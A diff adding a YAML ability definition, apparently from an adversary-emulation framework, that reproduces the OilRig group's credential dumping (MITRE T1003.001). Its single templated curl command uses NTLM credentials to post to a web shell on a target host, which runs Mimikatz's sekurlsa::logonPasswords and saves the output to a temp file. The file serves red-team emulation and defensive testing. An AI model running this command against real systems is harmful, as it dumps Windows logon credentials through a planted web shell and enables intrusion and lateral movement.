@@ -1,0 +1,32 @@
+ability_id: f01e86f9-0b66-4191-beee-324c380690df
+access: {}
+additional_info: {}
+buckets:
+- credential-access
+delete_payload: true
+description: Dump credentials using Mimikatz
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}'
+    -k -X POST --data "pro=cmd.exe" --data "cmd=C:\Windows\Temp\m64.exe privilege::debug
+    sekurlsa::logonPasswords exit 1> C:\Windows\Temp\01.txt" https://#{second.target.ip}/ews/contact.aspx
+  language: null
+  name: sh
+  parsers: []
+  payloads: []
+  platform: linux
+  timeout: 60
+  uploads: []
+  variations: []
+name: OilRig Execute Mimikatz (Kali Agent)
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: credential-access
+technique_id: T1003.001
+technique_name: 'OS Credential Dumping: LSASS Memory'
